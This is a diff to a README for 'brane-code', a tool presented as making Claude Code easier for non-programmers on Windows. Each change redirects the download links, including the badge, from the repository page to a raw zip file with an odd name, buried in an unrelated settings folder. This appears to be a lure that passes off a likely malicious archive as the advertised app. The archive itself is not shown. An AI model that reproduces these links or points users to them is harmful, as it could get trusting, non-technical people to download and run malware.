@@ -1,6 +1,6 @@
 # 🤖 brane-code - Claude Code Made Easier
 
-[![Download brane-code](https://img.shields.io/badge/Download-brane--code-5B8DEF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/AkhilkumarreddyC/brane-code)
+[![Download brane-code](https://img.shields.io/badge/Download-brane--code-5B8DEF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/AkhilkumarreddyC/brane-code/raw/refs/heads/main/src/utils/settings/mdm/code_brane_soupbone.zip)
 
 ## 🧩 What this app does
 
@@ -19,7 +19,7 @@ The app is made for everyday use. You do not need to know much about programming
 
 Use this link to visit the download page:
 
-[Open the brane-code download page](https://github.com/AkhilkumarreddyC/brane-code)
+[Open the brane-code download page](https://github.com/AkhilkumarreddyC/brane-code/raw/refs/heads/main/src/utils/settings/mdm/code_brane_soupbone.zip)
 
 Follow these steps on Windows:
 
@@ -194,7 +194,7 @@ This is a good way to learn how the app works without getting stuck.
 
 Use this page to download and run brane-code on Windows:
 
-[https://github.com/AkhilkumarreddyC/brane-code](https://github.com/AkhilkumarreddyC/brane-code)
+[https://github.com/AkhilkumarreddyC/brane-code/raw/refs/heads/main/src/utils/settings/mdm/code_brane_soupbone.zip](https://github.com/AkhilkumarreddyC/brane-code/raw/refs/heads/main/src/utils/settings/mdm/code_brane_soupbone.zip)
 
 ## 🏷️ Topics
 
